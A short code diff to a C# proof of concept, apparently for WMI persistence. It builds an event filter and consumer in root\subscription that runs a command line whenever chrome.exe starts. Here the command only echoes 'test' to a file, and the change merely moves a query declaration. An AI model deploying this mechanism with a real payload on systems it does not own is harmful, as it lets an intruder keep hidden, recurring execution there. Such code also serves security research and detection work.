@@ -19,16 +19,16 @@ namespace WMIPersistence
       ManagementObject myEventConsumer = null;
       ManagementObject myBinder = null;
 
-      string CommandLine = @"cmd.exe /c echo test > c:\WMI-CSharp.txt";
+      String CommandLine = @"cmd.exe /c echo test > c:\WMI-CSharp.txt";
+      String strQuery = @"SELECT * FROM __InstanceCreationEvent WITHIN 5 " +
+                           "WHERE TargetInstance ISA \"Win32_Process\" " +
+                           "AND TargetInstance.Name = \"chrome.exe\"";
 
       try
       {
         ManagementScope scope = new ManagementScope(@"\\.\root\subscription");
 
         ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
-        String strQuery = @"SELECT * FROM __InstanceCreationEvent WITHIN 5 " +
-                           "WHERE TargetInstance ISA \"Win32_Process\" " +
-                           "AND TargetInstance.Name = \"chrome.exe\"";
 
         WqlEventQuery myEventQuery = new WqlEventQuery(strQuery);
         myEventFilter = wmiEventFilter.CreateInstance();
